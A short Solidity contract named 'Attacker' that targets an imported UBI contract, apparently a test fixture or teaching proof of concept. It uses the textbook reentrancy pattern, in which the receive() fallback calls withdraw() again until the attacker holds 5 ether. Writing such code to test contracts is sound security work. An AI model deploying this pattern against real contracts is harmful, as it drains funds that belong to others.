//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.8;

import "./UBI.sol";

contract Attacker {
    UBI ubi;
    constructor(address _addr) public {
        ubi = UBI(_addr);
    }

    receive() external payable {
       if(address(this).balance < 5 ether) {
         ubi.withdraw();
       }
    }

    function withdraw() public {
        ubi.withdraw();
    }
}
